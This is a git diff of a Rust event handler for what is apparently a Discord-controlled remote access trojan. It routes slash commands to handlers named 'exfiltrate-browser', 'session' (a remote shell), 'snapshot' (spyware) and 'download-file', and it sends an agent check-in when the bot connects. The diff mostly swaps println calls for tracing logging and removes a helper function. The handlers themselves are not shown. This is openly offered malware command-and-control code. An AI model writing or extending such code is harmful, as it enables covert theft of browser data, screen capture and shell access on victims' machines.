@@ -1,10 +1,13 @@
 use crate::{
     commands::exfiltration::exfiltrate::handle_exfiltrate,
-    commands::shell::{exit, session::{session_handler, command_handler}, download::download_handler},
-    commands::spyware::snapshot::snapshot_handler,
     commands::misc::{info, purge::purge_handler},
-    register_commands,
-    send_agent_check_in,
+    commands::shell::{
+        download::download_handler,
+        exit,
+        session::{command_handler, session_handler},
+    },
+    commands::spyware::snapshot::snapshot_handler,
+    register_commands, send_agent_check_in,
     utils::agent::get_or_create_agent,
 };
 
@@ -21,33 +24,34 @@ use serenity::{
     },
 };
 
-use anyhow::Error;
+use tracing::{error, info as informational};
 
 pub struct MainHandler;
 
 #[async_trait]
 impl EventHandler for MainHandler {
-
     // This really only handles session messages
     async fn message(&self, ctx: Context, msg: Message) {
         let agent = get_or_create_agent(&ctx).await;
 
         if let Some(channel) = agent.get_session_channel() {
             if msg.channel_id == *channel {
-                command_handler(&ctx, &msg).await.expect("Failed to handle command");
+                command_handler(&ctx, &msg)
+                    .await
+                    .expect("Failed to handle command");
             }
         }
     }
 
     async fn ready(&self, ctx: Context, ready: Ready) {
-        println!("{} is connected!", ready.user.name);
+        informational!("{} is connected!", ready.user.name);
 
         register_commands(&ctx)
             .await
-            .expect("Error registering commands");
+            .unwrap_or_else(|e| error!("Failed to register commands: {:?}", e));
         send_agent_check_in(&ctx)
             .await
-            .unwrap_or_else(|e| eprintln!("Error sending message: {:?}", e));
+            .unwrap_or_else(|e| error!("Error sending message: {:?}", e));
     }
 
     async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
@@ -65,26 +69,28 @@ async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandIn
             "info" => info::run(&command.channel_id, agent),
             "purge" => {
                 if let Err(why) = purge_handler(ctx, &command).await {
+                    error!("Error handling purge: {:?}", why);
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
             }
             "exfiltrate-browser" => {
                 if let Err(why) = handle_exfiltrate(ctx, &command).await {
+                    error!("Error handling exfiltrate-browser: {:?}", why);
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
             }
             "session" => {
                 if let Err(why) = session_handler(ctx, &command).await {
-                    println!("Error handling session: {:?}", why);
+                    error!("Error handling session: {:?}", why);
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
             }
             "snapshot" => {
                 if let Err(why) = snapshot_handler(ctx, &command).await {
-                    println!("Error handling snapshot: {:?}", why);
+                    error!("Error handling snapshot: {:?}", why);
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
@@ -96,7 +102,7 @@ async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandIn
     } else if command.channel_id == agent.get_session_channel().unwrap() {
         let content = match command.data.name.as_str() {
             "exit" => {
-                exit::run(ctx).await.expect("TODO: panic message");
+                exit::run(ctx).await.expect("TODO: panic message"); // TODO: handle error
                 return;
             }
             "download-file" => {
@@ -120,21 +126,6 @@ async fn handle_error(ctx: &Context, command: &ApplicationCommandInteraction, co
         })
         .await
     {
-        println!("Cannot respond to slash command: {}", why);
+        error!("Cannot respond to slash command: {}", why);
     }
-}
-
-pub async fn ephemeral_interaction_create(
-    ctx: &Context,
-    command: &ApplicationCommandInteraction,
-    content: &str,
-) -> Result<(), Error> {
-    command
-        .create_interaction_response(&ctx.http, |response| {
-            response
-                .kind(InteractionResponseType::ChannelMessageWithSource)
-                .interaction_response_data(|message| message.content(content).ephemeral(true))
-        })
-        .await?;
-    Ok(())
 }
